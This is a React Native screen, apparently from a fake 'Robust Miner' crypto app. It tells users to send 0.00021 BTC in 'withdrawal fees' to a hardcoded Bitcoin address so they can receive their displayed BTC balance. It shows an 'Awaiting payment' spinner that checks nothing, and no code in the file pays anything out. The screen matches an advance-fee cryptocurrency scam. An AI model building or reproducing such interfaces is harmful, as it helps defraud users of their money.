import { useAuthStore } from '@/stores/authStore';
import FontAwesome from '@expo/vector-icons/build/FontAwesome';
import Ionicons from '@expo/vector-icons/build/Ionicons';

import * as Clipboard from 'expo-clipboard';
import { useRouter } from 'expo-router';
import { ActivityIndicator, ScrollView, StatusBar, StyleSheet, Text, TouchableOpacity, View } from 'react-native';
import { SafeAreaView } from 'react-native-safe-area-context';
import React = require('react');

export default function PayWithdrawalFees() {

    const router = useRouter()
    
    const { user } = useAuthStore()
  
  const copyToClipboard = async () => {
    await Clipboard.setStringAsync('bc1qaeh87g3t5cgax7874g3yf0q6mrnjhnhlvuflnp');
    alert('Address copied to clipboard!');
  };

  return (
    <SafeAreaView style={styles.container}>
      
      {/* Header */}
      <View style={styles.header}>
<TouchableOpacity style={styles.backButton} onPress={router.back}>
  <Ionicons name="arrow-back" size={24} color="white" />
</TouchableOpacity>

        <Text style={styles.headerTitle}>Pay Withdrawal Fees</Text>
      </View>
        <ScrollView 
            contentContainerStyle={{ flexGrow: 1 }}
            showsVerticalScrollIndicator={false}
        >
      <StatusBar backgroundColor="#00C853" barStyle="light-content" />

      {/* Main Content */}
      <View style={styles.content}>
        {/* Bitcoin Logo */}
        <View style={styles.bitcoinLogo}>
          <FontAwesome name="bitcoin" size={80} color="#00C853" />
        </View>

        {/* Amount */}
        <Text style={styles.amount}>0.00021 BTC</Text>
        <Text style={styles.subText}>Send 0.00021 BTC to receive your {user?.btc_amount} BTC withdraw</Text>

        {/* Send Fee Section */}
        <Text style={styles.sectionTitle}>send fee here:</Text>
        <View style={styles.addressContainer}>
          <Text style={styles.addressText}>bc1qaeh87g3t5cgax7874g3yf0q6mrnjhnhlvuflnp</Text>
          <TouchableOpacity style={styles.copyButton} onPress={copyToClipboard}>
            <Text style={styles.copyText}>Copy</Text>
          </TouchableOpacity>
        </View>

        {/* Awaiting Payment Button */}
        <TouchableOpacity style={styles.paymentButton}>
          <View style={styles.paymentButtonContent}>
            <ActivityIndicator size="small" color="orange" />
            <Text style={styles.paymentButtonText}>Awaiting payment</Text>
          </View>
        </TouchableOpacity>

        {/* Info Card */}
        <View style={styles.infoCard}>
          <FontAwesome name="bitcoin" size={24} color="#00C853" />
          <View style={styles.infoTextContainer}>
            <Text style={styles.infoTitle}>Bitcoin BTC</Text>
            <Text style={styles.infoValue}>Current Value: <Text style={{ fontWeight: 'bold' }}>{user?.btc_amount}</Text> BTC</Text>
          </View>
        </View>

        {/* Withdrawal Info */}
        <Text style={styles.withdrawalText}>withdrawal will be send to</Text>
        <Text style={styles.withdrawalAddress}>{user?.btc_address}</Text>
      </View>

      {/* Footer */}
      <View style={styles.footer}>
        <Text style={styles.footerText}>ROBUST MINER V 2025</Text>
      </View>
      </ScrollView>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: 'white',
    overflowY: 'auto'
  },
  header: {
    backgroundColor: '#00C853',
    flexDirection: 'row',
    alignItems: 'center',
    gap: 10,
    paddingHorizontal: 15,
    paddingVertical: 10,
  },
  backButton: {
    padding: 5,
  },
  headerTitle: {
    color: 'white',
    fontSize: 20,
    fontWeight: 'bold',
  },
  content: {
    flex: 1,
    padding: 20,
    alignItems: 'center',
  },
  bitcoinLogo: {
    marginVertical: 30,
  },
    image: {
    width: 200,
    height: 200,
    marginBottom: 40,
    resizeMode: 'contain',
  },
  amount: {
    fontSize: 32,
    fontWeight: 'bold',
    color: 'black',
    marginBottom: 5,
  },
  subText: {
    fontSize: 16,
    color: '#616161',
    textAlign: 'center',
    marginBottom: 30,
  },
  sectionTitle: {
    fontSize: 16,
    color: '#616161',
    marginBottom: 10,
  },
  addressContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 30,
  },
  addressText: {
    backgroundColor: '#f5f5f5',
    padding: 12,
    borderRadius: 8,
    marginRight: 10,
    fontSize: 14,
  },
  copyButton: {
    backgroundColor: '#e0e0e0',
    paddingVertical: 12,
    paddingHorizontal: 15,
    borderRadius: 8,
  },
  copyText: {
    fontWeight: 'bold',
  },
  paymentButton: {
    backgroundColor: 'white',
    borderWidth: 1,
    borderColor: '#00C853',
    paddingVertical: 15,
    paddingHorizontal: 30,
    borderRadius: 25,
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 30,
  },
  paymentButtonText: {
    color: '#00C853',
    fontWeight: 'bold',
    fontSize: 16,
    marginLeft: 5
  },
  infoCard: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#f5f5f5',
    padding: 15,
    borderRadius: 10,
    width: '100%',
    marginBottom: 30,
  },
  infoTextContainer: {
    marginLeft: 15,
  },
  infoTitle: {
    fontSize: 16,
    fontWeight: 'bold',
  },
  infoValue: {
    fontSize: 14,
    color: '#616161',
  },
  withdrawalText: {
    color: '#616161',
    marginBottom: 5,
  },
  withdrawalAddress: {
    fontWeight: 'bold',
    fontSize: 16,
  },
  footer: {
    padding: 15,
    borderTopWidth: 1,
    borderTopColor: '#e0e0e0',
  },
  footerText: {
    textAlign: 'center',
    color: '#9e9e9e',
  },
  lottieLoading: {
  width: 30,
  height: 30,
  marginRight: 10,
},
  paymentButtonContent: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
  },
});